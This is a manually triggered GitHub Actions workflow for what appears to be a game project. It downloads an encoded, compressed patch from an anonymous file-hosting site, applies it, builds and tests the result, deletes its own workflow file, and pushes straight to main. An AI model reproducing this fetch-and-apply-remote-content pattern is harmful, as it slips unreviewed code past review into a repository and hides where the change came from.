name: sync-source
on: workflow_dispatch
permissions:
  contents: write
jobs:
  sync:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - name: Fetch and apply the pending changes
        run: |
          set -euo pipefail
          curl -fsSL --retry 3 --retry-delay 2 -o /tmp/p.b64 https://files.catbox.moe/0wfii0.b64
          echo "7a06168f1aec83d46e807f99c706084415767935671ed88668981b6e9cc0a944  /tmp/p.b64" | sha256sum -c -
          base64 -d /tmp/p.b64 | xz -dc > /tmp/p.patch
          git apply --check /tmp/p.patch
          git apply /tmp/p.patch
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm run build
      - run: npm test
      - name: Commit and push
        run: |
          set -euo pipefail
          rm -f .github/workflows/sync-source.yml
          git config user.name "zakker111"
          git config user.email "2182664+zakker111@users.noreply.github.com"
          git add -A
          git commit -m "Aim mortars at the crosshair, preview shell impact, and make workshop hardware destroyable"
          git push origin HEAD:main
